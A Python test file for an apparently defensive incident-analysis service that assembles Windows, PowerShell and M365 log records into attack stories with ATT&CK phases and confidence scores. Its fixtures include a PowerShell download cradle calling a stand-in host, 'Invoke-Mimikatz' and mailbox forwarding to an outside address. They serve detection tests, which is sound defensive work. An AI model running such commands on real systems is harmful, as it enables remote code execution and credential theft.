"""Stories: one per person or host incident, read as ATT&CK phases, each step with why it belongs and how surely."""

from __future__ import annotations

from services.analysis.identity import MEDIUM, STRONG
from services.analysis.stories import build_stories, finding_phase, record_phase

SEC = {"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"}
SCM = {"provider": "Service Control Manager", "channel": "System"}
UAL = {"provider": "Microsoft 365 Unified Audit Log", "category": "M365 Exchange"}
ENTRA = {"provider": "Microsoft Entra ID Sign-in", "category": "Entra sign-in", "operation": "SignIn"}
T0 = 1_788_510_000_000
SETTINGS = {"internal_domains": ["northstar.example"]}
DANIEL = "daniel.roy@northstar.example"


def ev(n, minutes, base=SEC, **fields):
    return {"id": n, "ts": T0 + int(minutes * 60_000), **base, **fields}


def finding(rule, severity, refs, source="events", tags=(), attack=(), **entities):
    return {
        "ruleId": rule,
        "title": rule.replace("-", " "),
        "severity": severity,
        "source": source,
        "refs": list(refs),
        "tags": list(tags),
        "attack": list(attack),
        "entities": entities,
        "key": f"{rule}|{refs[0]}",
    }


def _intrusion():
    """A spray from one address, an RDP logon it wins, a group change and a log clear in that session, an admin share and a service on a server, mailbox forwarding."""
    host = "WS-004.northstar.example"
    events = [
        # the spray: daniel's account, and two others'
        *[ev(i, i * 0.1, eventId=4625, computer=host, targetUser="daniel.roy", targetDomain="NORTHSTAR", ipAddress="203.0.113.69", logonType=3) for i in range(1, 11)],
        ev(11, 1.1, eventId=4625, computer=host, targetUser="employee019", targetDomain="NORTHSTAR", ipAddress="203.0.113.69", logonType=3),
        ev(12, 1.2, eventId=4625, computer=host, targetUser="employee020", targetDomain="NORTHSTAR", ipAddress="203.0.113.69", logonType=3),
        ev(20, 10, eventId=4624, computer=host, targetUser="daniel.roy", targetDomain="NORTHSTAR", targetLogonId="0x9a01", logonType=10, ipAddress="203.0.113.69"),
        ev(21, 16, eventId=4732, computer=host, subjectUser="daniel.roy", subjectDomain="NORTHSTAR", subjectLogonId="0x9a01", memberSid="S-1-5-21-111-222-333-1042"),
        ev(22, 26, eventId=1102, computer=host, subjectUser="daniel.roy", subjectDomain="NORTHSTAR", subjectLogonId="0x9a01"),
        ev(23, 20, eventId=5140, computer="FS-001.northstar.example", subjectUser="daniel.roy", subjectDomain="NORTHSTAR", ipAddress="203.0.113.69", shareName="\\\\*\\ADMIN$"),
        # the service names no one: its tie to daniel is the admin share opened a minute before
        ev(24, 21, base=SCM, eventId=7045, computer="FS-001.northstar.example", serviceName="NSLabUpdater", serviceFile="C:\\Users\\Public\\x.exe"),
        *[ev(30 + i, 30 + i * 0.2, base=UAL, operation="MailItemsAccessed", user=DANIEL, upn=DANIEL, subjectUser=DANIEL, ipAddress="203.0.113.69") for i in range(5)],
        ev(40, 35, base=UAL, operation="Set-Mailbox", user=DANIEL, upn=DANIEL, subjectUser=DANIEL, ipAddress="203.0.113.69",
           summary=f"Set-Mailbox by {DANIEL} from 203.0.113.69 ForwardingSmtpAddress=smtp:finance@secure-documents.example"),
        # a sign-in of daniel's from his usual address, with no finding: not in the story
        ev(41, 40, base=ENTRA, user=DANIEL, upn=DANIEL, subjectUser=DANIEL, targetUser=DANIEL, ipAddress="198.51.100.10", status="0"),
    ]  # fmt: skip
    findings = [
        finding("win-bruteforce-4625-by-ip", "critical", [*range(1, 13), 20], tags=["brute-force"], attack=["T1110"], ipAddress="203.0.113.69"),
        finding("win-rdp-logon-external", "high", [20], tags=["lateral-movement"], attack=["T1021.001"], ipAddress="203.0.113.69"),
        finding("win-user-added-privileged-group", "medium", [21], tags=["persistence"], attack=["T1098"]),
        finding("win-audit-log-cleared", "critical", [22], tags=["defense-evasion", "log-tampering"], attack=["T1685.005"]),
        finding("win-admin-share-access", "medium", [23], tags=["lateral-movement"], attack=["T1021.002"], ipAddress="203.0.113.69"),
        finding("win-service-installed-suspicious", "high", [24], tags=["persistence"], attack=["T1543.003"]),
        finding("m365-mailitemsaccessed-burst", "medium", range(30, 35), tags=["collection"], attack=["T1114.002"], ipAddress="203.0.113.69"),
        finding("m365-mailbox-forwarding", "critical", [40], tags=["forwarding"], attack=["T1114.003"], ipAddress="203.0.113.69"),
    ]
    return events, findings


def test_an_intrusion_reads_as_one_story_in_phases_with_every_step_tied():
    events, findings = _intrusion()
    res = build_stories(events, [], findings, SETTINGS)
    [story] = res["stories"]
    assert story["kind"] == "person" and story["subject"]["label"] == DANIEL and story["severity"] == "critical"
    assert [p["phase"] for p in story["phases"]] == [
        "credential-access",
        "initial-access",
        "persistence",
        "lateral-movement",
        "defense-impairment",
        "collection",
    ]
    by_ref = {r: s for s in story["steps"] for r in s["refs"]}
    # the spray folds into two steps: daniel's failures, and the other accounts the same address tried
    spray = by_ref["event:1"]
    assert spray["count"] == 10 and spray["phase"] == "credential-access" and by_ref["event:11"] is by_ref["event:12"]
    assert by_ref["event:11"]["tie"]["kind"] == "address" and len(by_ref["event:11"]["accounts"]) == 2
    # the RDP logon from outside is initial access whatever the brute force before it reads as
    rdp = by_ref["event:20"]
    assert rdp["phase"] == "initial-access" and rdp["session"] and rdp["tie"]["confidence"] == STRONG
    # the log clear happened in that session: defense impairment, the technique deciding what defense-evasion means in ATT&CK v19
    clear = by_ref["event:22"]
    assert clear["phase"] == "defense-impairment" and clear["session"] == rdp["session"]
    # the admin share on the server: the same outside source was already in, so it is lateral movement
    assert by_ref["event:23"]["phase"] == "lateral-movement"
    # the service names no one; the admin share a minute before is its tie to the story, by time only
    service = by_ref["event:24"]
    assert service["phase"] == "persistence" and service["hops"] and service["tie"]["confidence"] == MEDIUM
    assert story["confidence"] == MEDIUM
    # five mailbox reads are one step
    assert by_ref["event:30"]["count"] == 5 and by_ref["event:30"]["phase"] == "collection"
    assert "event:41" not in by_ref
    assert story["attackerAddresses"] == ["203.0.113.69"] and story["hosts"] == ["fs-001", "ws-004"]
    assert story["headline"].startswith("win bruteforce 4625 by ip")
    assert any("FS-001" in g and "What ran" in g for g in story["gaps"])
    assert [h["kind"] for h in story["lineage"]["hops"]] == ["rdp", "remote-service"]
    # the same rows give the same story
    again = build_stories(events, [], findings, SETTINGS)["stories"][0]
    assert again["id"] == story["id"] and again["steps"] == story["steps"]


def test_the_address_and_what_it_left_make_a_campaign_with_the_accounts_it_tried():
    events, findings = _intrusion()
    res = build_stories(events, [], findings, SETTINGS)
    [camp] = res["campaigns"]
    assert camp["label"] == "203.0.113.69" and camp["stories"] == [res["stories"][0]["id"]]
    assert {(a["kind"], a["value"]) for a in camp["artifacts"]} >= {("ip", "203.0.113.69"), ("forwarding", "finance@secure-documents.example")}
    assert [(t["account"], t["how"]) for t in camp["targets"]] == [("northstar\\employee019", ["failed logon"]), ("northstar\\employee020", ["failed logon"])]


def test_a_mail_received_or_failed_logons_alone_start_no_story():
    mails = [{"id": 7, "date": T0, "fromAddr": "it-support@northstar-helpdesk.example", "subject": "Password expiry", "to": [{"addr": DANIEL}]}]
    events = [
        ev(i, i * 0.1, eventId=4625, computer="WS-004", targetUser="carla.morel", targetDomain="NORTHSTAR", ipAddress="203.0.113.99") for i in range(1, 11)
    ]
    findings = [
        finding("mail-credential-phishing", "high", [7], source="mails", tags=["phishing"]),
        finding("win-bruteforce-4625-by-account", "high", range(1, 11), tags=["brute-force"], ipAddress="203.0.113.99"),
    ]
    res = build_stories(events, mails, findings, SETTINGS)
    assert res["stories"] == []
    assert {u["ref"] for u in res["unstoried"]} == {"mail:7", *(f"event:{i}" for i in range(1, 11))}
    # they are still there to see: the sender's mails and the address's guesses
    assert {(c["labelKind"], c["label"]) for c in res["campaigns"]} == {("sender-domain", "northstar-helpdesk.example"), ("ip", "203.0.113.99")}


def test_a_flagged_mail_starts_a_story_only_once_its_recipient_acts_on_it():
    """A reply-to diverted to a vendor, a link to the organisation's own portal, and the recipient's
    routine day after it: a chain, but a mail received. The link to the vendor's site resolved is the click."""
    sysmon = {"provider": "Microsoft-Windows-Sysmon", "channel": "Microsoft-Windows-Sysmon/Operational"}
    mail = {
        "id": 8,
        "date": T0,
        "fromAddr": "employee027@northstar.example",
        "replyTo": [{"addr": "accounts@billing.vendor.example"}],
        "subject": "Approved purchase order NS-0000013",
        "to": [{"addr": DANIEL}],
        "risk": 28,
        "urls": [{"url": "https://northstar.example/reports/13", "host": "northstar.example", "domain": "northstar.example"}],
    }
    me = {"computer": "WS-004", "user": "NORTHSTAR\\daniel.roy", "subjectUser": "daniel.roy", "subjectDomain": "NORTHSTAR"}
    events = [
        ev(1, 30, base=sysmon, eventId=22, query="portal.northstar.example", **me),
        ev(2, 90, eventId=4648, targetServerName="FS-001", **me),
    ]
    findings = [finding("mail-replyto-diverted", "medium", [8], source="mails", tags=["spoofing", "bec"], attack=["T1566.002"])]
    res = build_stories(events, [mail], findings, {})
    [chain] = res["chains"]["chains"]
    assert chain["artifactLinks"] == 0
    assert res["stories"] == [] and "mail:8" in {u["ref"] for u in res["unstoried"]}
    # the vendor's link resolved on daniel's host: he acted on the mail, and that is a story
    lure = dict(
        mail,
        urls=[*mail["urls"], {"url": "https://docs.vendor-billing.example/inv", "host": "docs.vendor-billing.example", "domain": "vendor-billing.example"}],
    )
    clicked = [*events, ev(3, 5, base=sysmon, eventId=22, query="docs.vendor-billing.example", **me)]
    [story] = build_stories(clicked, [lure], findings, {})["stories"]
    assert story["subject"]["label"] == DANIEL and [p["phase"] for p in story["phases"]][:2] == ["initial-access", "execution"]


def test_flags_two_days_apart_are_two_incidents_and_a_namesake_elsewhere_is_its_own_story():
    events = [
        ev(1, 0, eventId=4698, computer="WS-001", subjectUser="alice.martin", subjectDomain="NORTHSTAR", taskName="\\Updater"),
        ev(2, 60 * 72, eventId=4698, computer="WS-001", subjectUser="alice.martin", subjectDomain="NORTHSTAR", taskName="\\Updater2"),
        # the other tenant's alice.martin, named beside its own UPN
        ev(3, 30, eventId=1102, computer="OTHER-WS-001.other-tenant.example", subjectUser="alice.martin@other-tenant.example", subjectDomain="OTHER"),
        ev(4, 31, eventId=4624, computer="OTHER-WS-001.other-tenant.example", subjectUser="alice.martin@other-tenant.example", subjectDomain="OTHER", targetUser="alice.martin", targetDomain="OTHER", targetLogonId="0x5", logonType=2),
    ]  # fmt: skip
    findings = [
        finding("win-scheduled-task-suspicious-content", "high", [1], tags=["persistence"]),
        finding("win-scheduled-task-suspicious-content", "high", [2], tags=["persistence"]),
        finding("win-audit-log-cleared", "critical", [3], tags=["defense-evasion"], attack=["T1685.005"]),
    ]
    res = build_stories([*events], [], findings, SETTINGS)
    labels = sorted((s["subject"]["label"], s["steps"][0]["id"]) for s in res["stories"])
    assert labels == [("alice.martin@other-tenant.example", "event:3"), ("northstar\\alice.martin", "event:1"), ("northstar\\alice.martin", "event:2")]
    home = [s for s in res["stories"] if s["subject"]["label"] == "northstar\\alice.martin"]
    assert all("event:3" not in {r for st in s["steps"] for r in st["refs"]} for s in home)
    other = next(i for i in res["identities"] if i["label"] == "alice.martin@other-tenant.example")
    assert other["org"] == "other-tenant.example"


def test_a_sign_in_from_a_joined_device_happened_on_that_host():
    events, findings = _intrusion()
    signin = dict(
        ev(50, 45, base=ENTRA, user=DANIEL, upn=DANIEL, subjectUser=DANIEL, targetUser=DANIEL, ipAddress="203.0.113.69", status="0"),
        data={"deviceName": "WS-004", "deviceId": "b1c2", "trustType": "Hybrid Azure AD joined"},
    )
    findings.append(finding("m365-signin-risky", "high", [50], tags=["initial-access"], attack=["T1078.004"], ipAddress="203.0.113.69"))
    [story] = build_stories([*events, signin], [], findings, SETTINGS)["stories"]
    [step] = [st for st in story["steps"] if "event:50" in st["refs"]]
    assert step["host"] == "ws-004" and "from the Entra device WS-004 (Hybrid Azure AD joined)" in step["notes"]


# rule measures shaped like rules/measures.json's: what a host's flags stand on
MEASURES = {
    # detects what it looks for on recorded attacks; the clean machines do not log what it reads
    "win-scheduled-task-suspicious-content": {"hits": 12, "of": 12, "fires": 14},
    # detects, and fires on clean machines too
    "win-powershell-suspicious-scriptblock": {"hits": 28, "of": 38, "clean": {"findings": 4, "events": 4, "machines": 3, "scope": 322, "of": 6}},
    "win-process-access-hollowing": {"hits": 5, "of": 13, "clean": {"findings": 139, "events": 1685, "machines": 7, "scope": 1619360, "of": 7}},
    # detects, and never fired on the clean machines that log what it reads
    "win-wmi-persistence": {"hits": 6, "of": 6, "clean": {"findings": 0, "events": 0, "machines": 0, "scope": 430, "of": 7}},
    "win-service-installed-suspicious": {"hits": 10, "of": 14, "clean": {"findings": 0, "events": 0, "machines": 0, "scope": 218, "of": 7}},
}


def test_a_flag_on_a_host_that_names_no_one_is_a_host_story_and_false_positives_are_left_out():
    events = [
        ev(1, 0, base=SCM, eventId=7045, computer="FS-002.northstar.example", serviceName="evil", serviceFile="C:\\x.exe"),
        ev(2, 5, eventId=4698, computer="WS-009", subjectUser="bob", subjectDomain="NORTHSTAR", taskName="\\t"),
    ]
    fp = finding("win-scheduled-task-suspicious-content", "high", [2], tags=["persistence"])
    fp["status"] = "false_positive"
    res = build_stories(events, [], [finding("win-service-installed-suspicious", "high", [1], tags=["persistence"]), fp], SETTINGS, measures=MEASURES)
    [story] = res["stories"]
    assert story["kind"] == "host" and story["subject"]["id"] == "fs-002" and story["phases"][0]["phase"] == "persistence"
    assert story["steps"][0]["tie"] == {"kind": "flag", "basis": "a finding on fs-002", "confidence": STRONG}
    # it stands on its rule's measure: it detects what it looks for and never fired on the clean machines
    assert "its rule detects what it looks for on recorded attacks and was not seen firing on clean machines" in story["standing"]


def _refs(story):
    return {r for st in story["steps"] for r in st["refs"]}


def test_a_persons_routine_programs_neither_join_by_name_nor_push_a_later_foothold_out():
    host = "WS-001.northstar.example"
    me = dict(subjectUser="alice.martin", subjectDomain="NORTHSTAR")
    events = [
        ev(5, -5, eventId=4624, computer=host, targetUser="alice.martin", targetDomain="NORTHSTAR", targetLogonId="0x9001", logonType=2),
        ev(1, 0, eventId=4688, computer=host, newProcessId="0x10", processName="C:\\Users\\Public\\mimikatz.exe", subjectLogonId="0x9001", **me),
        # a program mimikatz started, under another logon: its process tree ties it
        ev(2, 1, eventId=4688, computer=host, newProcessId="0x20", callerProcessId="0x10", processName="C:\\Windows\\System32\\cmd.exe", subjectLogonId="0x9002", **me),
        # her own day on another host: her name alone does not put it in the story
        ev(3, 30, eventId=4688, computer="WS-002.northstar.example", newProcessId="0x30", processName="C:\\Windows\\notepad.exe", subjectLogonId="0x7001", **me),
        # a scheduled task five hours later, with no finding, after six hundred programs of the session
        ev(4, 300, eventId=4698, computer=host, taskName="\\Updater", subjectLogonId="0x9001", **me),
        *[
            ev(100 + i, 2 + i * 0.3, eventId=4688, computer=host, newProcessId=hex(0x1000 + i), processName="C:\\Windows\\System32\\conhost.exe", subjectLogonId="0x9001", **me)
            for i in range(600)
        ],
    ]  # fmt: skip
    res = build_stories(events, [], [finding("win-mimikatz", "critical", [1], tags=["credential-access"])], SETTINGS)
    [story] = res["stories"]
    by_ref = {r: s for s in story["steps"] for r in s["refs"]}
    assert "event:3" not in by_ref
    assert by_ref["event:2"]["tie"]["basis"].endswith("its process descends from mimikatz.exe, a process of the story")
    assert "in the story's logon session 0x9001" in by_ref["event:100"]["tie"]["basis"]
    # past 400 steps the foothold stays and the programs run with no finding go, and the story says so
    assert by_ref["event:4"]["phase"] == "persistence"
    assert by_ref["event:5"]["tie"]["kind"] == "session"
    assert len(story["steps"]) == 400 and story["stepsTruncated"] == 204 and res["stats"]["stepsTruncated"] == 1
    assert any(g.startswith("The story keeps 400 of its 604 steps") for g in story["gaps"])


def test_failed_logons_between_two_intrusions_do_not_make_them_one_story():
    host = "WS-001.northstar.example"
    me = dict(subjectUser="alice.martin", subjectDomain="NORTHSTAR", subjectLogonId="0x9001")
    day = 24 * 60
    fails = [
        ev(10 + d, d * day, eventId=4625, computer=host, targetUser="alice.martin", targetDomain="NORTHSTAR", ipAddress="203.0.113.7", logonType=3)
        for d in range(1, 21)
    ]
    events = [
        ev(1, 0, eventId=4688, computer=host, newProcessId="0x10", processName="C:\\Users\\Public\\a.exe", **me),
        *fails,
        ev(2, 21 * day, eventId=4688, computer=host, newProcessId="0x20", processName="C:\\Users\\Public\\b.exe", **me),
    ]
    findings = [finding("rule-a", "high", [1], tags=["execution"]), finding("rule-b", "high", [2], tags=["execution"])]
    findings += [finding("win-bruteforce-4625-by-account", "medium", [e["id"]], tags=["brute-force"], ipAddress="203.0.113.7") for e in fails]
    res = build_stories(events, [], findings, SETTINGS)
    first, second = sorted(res["stories"], key=lambda s: s["start"])
    # each incident holds the failures of its own days, and the spray's address links the two
    assert {"event:1", "event:11"} <= _refs(first) and "event:2" not in _refs(first) and first["end"] - first["start"] <= 3 * 86_400_000
    assert {"event:2", "event:30"} <= _refs(second) and "event:1" not in _refs(second)
    assert "event:20" in {u["ref"] for u in res["unstoried"]}
    assert any(set(c["stories"]) == {first["id"], second["id"]} for c in res["campaigns"])


def test_the_flags_of_the_stories_past_max_stories_are_listed_as_unstoried():
    events = [
        ev(
            i,
            i,
            eventId=4688,
            computer="WS-001",
            newProcessId=hex(i),
            processName="C:\\x.exe",
            subjectUser=f"user{i}",
            subjectDomain="NORTHSTAR",
            subjectLogonId=hex(0x100 + i),
        )
        for i in range(1, 6)
    ]
    res = build_stories(events, [], [finding(f"rule-{i}", "medium", [i], tags=["execution"]) for i in range(1, 6)], SETTINGS, max_stories=2)
    assert len(res["stories"]) == 2 and res["stats"]["storiesTruncated"] == 1
    lost = {u["ref"]: u["why"] for u in res["unstoried"]}
    assert set(lost) == {f"event:{i}" for i in range(1, 6)} - {r for s in res["stories"] for r in _refs(s)} and len(lost) == 3
    assert all("highest-scoring stories" in why for why in lost.values())


def test_an_address_most_of_the_organisation_signs_in_from_ties_nothing_and_makes_no_campaign():
    """An office's NAT, named by two unrelated findings: two stories, no campaign, no forty targets."""
    nat, carla = "198.51.100.50", "carla.morel@northstar.example"
    events = [
        ev(1, 0, base=ENTRA, upn=DANIEL, user=DANIEL, ipAddress=nat, status="0", appDisplayName="Azure CLI"),
        ev(2, 300, base=ENTRA, upn=carla, user=carla, ipAddress=nat, status="0", appDisplayName="Graph Explorer"),
        *[ev(100 + k, k, base=ENTRA, upn=f"employee{k:03d}@northstar.example", user=f"employee{k:03d}@northstar.example", ipAddress=nat, status="0") for k in range(40)],
    ]  # fmt: skip
    findings = [
        finding("m365-signin-risky-app", "medium", [1], tags=["initial-access"], ipAddress=nat),
        finding("m365-legacy-auth", "medium", [2], tags=["initial-access"], ipAddress=nat),
    ]
    res = build_stories(events, [], findings, SETTINGS)
    assert sorted(s["subject"]["label"] for s in res["stories"]) == [carla, DANIEL] and res["campaigns"] == []
    for s in res["stories"]:
        assert s["attackerAddresses"] == [] and s["sharedAddresses"] == [nat]
        assert f"Most of the organisation's users sign in from {nat}" in s["summary"]
    # four others signing in from it is no organisation's egress: the address links the two stories
    few = build_stories(events[:6], [], findings, SETTINGS)
    [camp] = few["campaigns"]
    assert camp["label"] == nat and len(camp["stories"]) == 2 and len(camp["targets"]) == 4


def test_a_campaign_lists_the_accounts_its_address_reached_around_its_stories_only():
    events, findings = _intrusion()
    # ten days later the same address tries another account: someone else's, as far as the case shows
    events.append(
        ev(
            60,
            10 * 24 * 60,
            eventId=4625,
            computer="WS-004.northstar.example",
            targetUser="employee021",
            targetDomain="NORTHSTAR",
            ipAddress="203.0.113.69",
            logonType=3,
        )
    )
    [camp] = build_stories(events, [], findings, SETTINGS)["campaigns"]
    assert [t["account"] for t in camp["targets"]] == ["northstar\\employee019", "northstar\\employee020"]


def test_a_script_block_is_a_step_of_the_person_its_header_names():
    """PowerShell names the user of a script block only by the SID in its System header; the logon joins it to them."""
    sid = "S-1-5-21-111-222-333-1107"
    host = "WS-004.northstar.example"
    ps = {"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"}
    events = [
        ev(1, 0, eventId=4624, computer=host, targetUser="daniel.roy", targetDomain="NORTHSTAR", targetSid=sid, targetLogonId="0x9a01", logonType=2),
        ev(2, 5, base=ps, eventId=4104, computer=host, userSid=sid, scriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://x')"),
        ev(3, 6, base=ps, eventId=4104, computer=host, userSid="S-1-5-18", scriptBlockText="Invoke-Mimikatz"),
    ]
    findings = [finding("ps-download-cradle", "high", [2], tags=["execution"]), finding("ps-mimikatz", "high", [3], tags=["credential-access"])]
    res = build_stories(events, [], findings, SETTINGS)
    by_subject = {s["subject"]["id"] if s["kind"] == "host" else s["subject"]["label"]: s for s in res["stories"]}
    assert set(by_subject) == {"northstar\\daniel.roy"}
    by_ref = {r: st for st in by_subject["northstar\\daniel.roy"]["steps"] for r in st["refs"]}
    assert by_ref["event:2"]["tie"]["kind"] == "flag" and by_ref["event:2"]["tie"]["basis"] == "the record names them (user)"
    # SYSTEM's script block names no one: daniel's console session was the only one open on WS-004, so it is his, by time and place
    assert by_ref["event:3"]["tie"] == {"kind": "flag", "basis": "on ws-004 while northstar\\daniel.roy's session 0x9a01 was open", "confidence": MEDIUM}


def test_a_machine_account_or_a_service_is_never_a_storys_subject():
    host = "WS-001.northstar.example"
    fw = {"provider": "Microsoft-Windows-Windows Firewall With Advanced Security", "channel": "Microsoft-Windows-Windows Firewall With Advanced Security"}
    events = [
        # an SCCM client push: the site server's machine account opens ADMIN$, then its client is installed
        ev(1, 0, eventId=4624, computer=host, targetUser="SCCM01$", targetDomain="NORTHSTAR", targetLogonId="0x88", logonType=3, ipAddress="10.0.0.20", workstation="SCCM01"),
        ev(2, 0.1, eventId=5140, computer=host, subjectUser="SCCM01$", subjectDomain="NORTHSTAR", subjectLogonId="0x88", shareName="\\\\*\\ADMIN$", ipAddress="10.0.0.20"),
        ev(3, 2, base=SCM, eventId=7045, computer=host, serviceName="ccmsetup", serviceFile="C:\\Windows\\ccmsetup\\ccmsetup.exe"),
        # a firewall rule the firewall service's own SID added (ModifyingUser, read as the subject)
        ev(4, 3, base=fw, eventId=2004, computer=host, subjectUser="S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052"),
    ]  # fmt: skip
    findings = [
        finding("win-service-installed-suspicious", "high", [3], tags=["persistence"]),
        finding("fw-rule-added", "medium", [4], tags=["defense-evasion"]),
    ]
    # rules never measured: their two phases are what the host's story stands on
    res = build_stories(events, [], findings, SETTINGS, measures={})
    [story] = res["stories"]
    assert story["kind"] == "host" and story["subject"]["id"] == "ws-001"
    assert {"event:3", "event:4"} <= {r for st in story["steps"] for r in st["refs"]}
    assert not res["identities"]


def test_a_flag_lineage_ties_by_time_only_is_medium_and_so_is_its_story():
    host = "WS-001.northstar.example"
    events = [
        ev(1, 0, eventId=4624, computer=host, targetUser="dave", targetDomain="NORTHSTAR", targetLogonId="0x3001", logonType=3, ipAddress="10.0.0.31", workstation="WS-031"),
        # WmiPrvSE started it under its own account half a minute later: the 4688 names no caller logon
        ev(2, 0.5, eventId=4688, computer=host, newProcessId="0x900", processName="C:\\Windows\\System32\\cmd.exe",
           parentProcessName="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", subjectUser="WS-001$", subjectDomain="NORTHSTAR", subjectLogonId="0x3e4"),
    ]  # fmt: skip
    [story] = build_stories(events, [], [finding("win-wmi-child", "high", [2], tags=["execution"])], SETTINGS)["stories"]
    by_ref = {r: s for s in story["steps"] for r in s["refs"]}
    assert by_ref["event:2"]["tie"] == {"kind": "flag", "basis": "it is part of their way into ws-001 (wmi)", "confidence": MEDIUM}
    # the logon it is tied to by time comes with it no surer
    assert by_ref["event:1"]["tie"]["kind"] == "hop" and by_ref["event:1"]["tie"]["confidence"] == MEDIUM
    assert story["confidence"] == MEDIUM


def test_a_logon_id_reused_after_a_reboot_keeps_the_other_persons_logon_out():
    host = "WS-001.northstar.example"
    events = [
        ev(1, 0, eventId=4624, computer=host, targetUser="alice.martin", targetDomain="NORTHSTAR", targetLogonId="0x5a3f1", logonType=2),
        ev(2, 60, eventId=4634, computer=host, targetUser="alice.martin", targetDomain="NORTHSTAR", targetLogonId="0x5a3f1"),
        ev(3, 3 * 1440, eventId=4698, computer=host, subjectUser="bob.leroy", subjectDomain="NORTHSTAR", subjectLogonId="0x5a3f1", taskName="\\evil"),
    ]
    [story] = build_stories(events, [], [finding("win-scheduled-task", "high", [3], tags=["persistence"])], SETTINGS)["stories"]
    assert story["subject"]["label"] == "northstar\\bob.leroy" and [r for s in story["steps"] for r in s["refs"]] == ["event:3"]
    assert story["lineage"]["sessions"][0]["user"] == "bob.leroy"


def test_both_logons_of_a_split_token_are_the_session_of_the_story():
    host = "WS-004.northstar.example"
    logon = {"computer": host, "eventId": 4624, "targetUser": "daniel.roy", "targetDomain": "NORTHSTAR", "logonType": 2}
    events = [
        ev(1, 0, **logon, targetLogonId="0x9a01", targetLinkedLogonId="0x9a02", elevatedToken="%%1842"),
        ev(2, 0, **logon, targetLogonId="0x9a02", targetLinkedLogonId="0x9a01"),
        ev(3, 5, eventId=4698, computer=host, subjectUser="daniel.roy", subjectDomain="NORTHSTAR", subjectLogonId="0x9a01", taskName="\\t"),
    ]
    [story] = build_stories(events, [], [finding("win-scheduled-task", "high", [3], tags=["persistence"])], SETTINGS)["stories"]
    by_ref = {r: s for s in story["steps"] for r in s["refs"]}
    # the two logons of one moment fold into one step, the session's
    assert by_ref["event:1"] is by_ref["event:2"] and by_ref["event:2"]["tie"]["kind"] == "session" and by_ref["event:2"]["tie"]["confidence"] == STRONG
    assert {s["logonId"] for s in story["lineage"]["sessions"]} == {"0x9a01", "0x9a02"}


def test_phases_from_tags_techniques_and_records():
    assert finding_phase({"tags": ["execution", "persistence"]}) == ("execution", "rule tag execution")
    assert finding_phase({"tags": ["defense-evasion"], "attack": ["T1027"]}) == ("stealth", "rule tag defense-evasion, technique T1027")
    assert finding_phase({"tags": ["defense-evasion"], "attack": ["T1685.005"]}) == ("defense-impairment", "rule tag defense-evasion, technique T1685.005")
    assert finding_phase({"tags": ["sigma"], "attack": ["attack.t1003.001"]}) == ("credential-access", "technique ATTACK.T1003.001")
    assert finding_phase({"tags": ["sigma"]}) == (None, "")
    assert record_phase({"eventId": 4624, "logonType": 10, "ipAddress": "203.0.113.5"}, "events", set())[0] == "initial-access"
    assert record_phase({"eventId": 4624, "logonType": 10, "ipAddress": "10.0.0.5"}, "events", set())[0] == "lateral-movement"
    assert record_phase({"eventId": 4624, "logonType": 3, "ipAddress": "10.0.0.5"}, "events", set())[0] is None
    assert record_phase({**ENTRA, "status": "0", "ipAddress": "203.0.113.5"}, "events", {"203.0.113.5"})[0] == "initial-access"
    assert record_phase({**ENTRA, "status": "0", "ipAddress": "198.51.100.1"}, "events", {"203.0.113.5"})[0] is None
    assert record_phase({**UAL, "operation": "New-InboxRule"}, "events", set())[0] == "collection"
    assert record_phase({"eventId": 1102}, "events", set())[0] == "defense-impairment"
    assert record_phase({"subject": "x"}, "mails", set())[0] == "initial-access"
    assert MEDIUM != STRONG


def test_carrier_grade_nat_is_not_the_internet():
    """100.64.0.0/10 is a provider's (or Tailscale's) shared space: an RDP logon from it is no way in from outside."""
    assert record_phase({**SEC, "eventId": 4624, "logonType": 10, "ipAddress": "100.100.5.5"}, "events", set())[0] == "lateral-movement"
    assert record_phase({**SEC, "eventId": 4624, "logonType": 10, "ipAddress": "100.128.0.1"}, "events", set())[0] == "initial-access"


# --- score, severity and what starts a story -----------------------------------------------------------

# measures as rules/measures.json holds them: seen to detect, a lead, one that fires on every clean machine
DETECTS = {"of": 5, "hits": 4, "fires": 4}
LEAD = {"of": 3}
NOISY = {"of": 5, "hits": 4, "clean": {"findings": 40, "events": 40, "machines": 7, "of": 7, "scope": 400}}


def _admin_and_ransomware():
    """Review finding R10: an admin's whoami, psexec and scheduled task (three medium findings in three
    phases) beside one critical shadow-copy deletion on another person's host."""
    admin = dict(subjectUser="it-admin", subjectDomain="NORTHSTAR", subjectLogonId="0x66")
    events = [
        ev(1, 0, eventId=4688, computer="WS-001", newProcessId="0x1", processName="C:\\Windows\\System32\\whoami.exe", **admin),
        ev(2, 1, eventId=4688, computer="WS-001", newProcessId="0x2", processName="C:\\Tools\\psexec.exe", **admin),
        ev(3, 2, eventId=4698, computer="WS-001", taskName="\\Backup", **admin),
        ev(4, 0, eventId=4688, computer="WS-009", newProcessId="0x3", processName="C:\\Windows\\System32\\vssadmin.exe", subjectUser="eve", subjectDomain="NORTHSTAR", subjectLogonId="0x77"),
    ]  # fmt: skip
    findings = [
        finding("whoami", "medium", [1], tags=["discovery"], attack=["T1033"]),
        finding("psexec", "medium", [2], tags=["lateral-movement"], attack=["T1021.002"]),
        finding("schtask", "medium", [3], tags=["persistence"], attack=["T1053.005"]),
        finding("shadow-delete", "critical", [4], tags=["impact"], attack=["T1490"]),
    ]
    return events, findings


def test_a_critical_finding_outranks_three_mediums_of_an_admins_day():
    events, findings = _admin_and_ransomware()
    res = build_stories(events, [], findings, SETTINGS, measures={})
    ransom, admin = res["stories"]
    assert ransom["subject"]["label"] == "northstar\\eve" and ransom["severity"] == "critical"
    assert admin["subject"]["label"] == "northstar\\it-admin" and ransom["score"] > admin["score"]
    # the admin's run is discovery then lateral movement: the task came after them and is out of ATT&CK's order
    parts = admin["scoreParts"]
    assert [w["phase"] for w in parts["run"]] == ["discovery", "lateral-movement"] and parts["others"] == 1 and parts["techniques"] == 3
    assert admin["summary"].count(f"Score {admin['score']}: discovery → lateral movement in ATT&CK's order") == 1
    # three techniques in three phases from rules never measured still read as an intrusion...
    assert admin["severity"] == "high"
    # ...and the story names the findings that raise it, for the page to restate after a dispute
    assert sorted(f["phase"] for f in admin["firm"]) == ["discovery", "lateral-movement", "persistence"]
    assert {f["step"] for f in admin["firm"]} <= {s["id"] for s in admin["steps"]}
    # ...but not when one of them fires on clean machines, or is a lead
